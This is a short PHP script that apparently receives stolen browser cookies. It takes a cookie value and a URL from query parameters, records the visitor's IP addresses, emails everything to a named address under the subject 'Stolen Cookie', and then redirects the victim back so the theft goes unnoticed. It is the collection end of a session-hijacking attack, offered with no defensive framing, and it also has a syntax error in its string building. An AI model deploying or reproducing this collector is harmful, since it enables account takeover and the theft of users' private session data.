<?php

$cookie = $_GET["cookie"];
$link = $_GET["link"];
$message = '<p><b>cookies:</b> ' . $cookie . '</p><p><b>URL:</b> ' . $link . '</p><p><b>HTTP_X_FORWARDED_FOR:</b> ' . {$_SERVER['HTTP_X_FORWARDED_FOR']} . ' & <b>REMOTE_ADDR:</b> ' . {$_SERVER['REMOTE_ADDR']} . '</p>';

if (!(empty($cookie) && empty($link))) {
    $headers = array(
        'From: no-reply@hetbaarnschlyceum.nl',
        'Content-Type:text/html',
        'Reply-To: no-reply@hetbaarnschlyceum.nl'
    );
    mail('lucacastelnuovo@hetbaarnschlyceum.nl', 'CDN | Hacking | Stolen Cookie', $message, implode("\r\n", $headers));
    header("Location: $link");
}
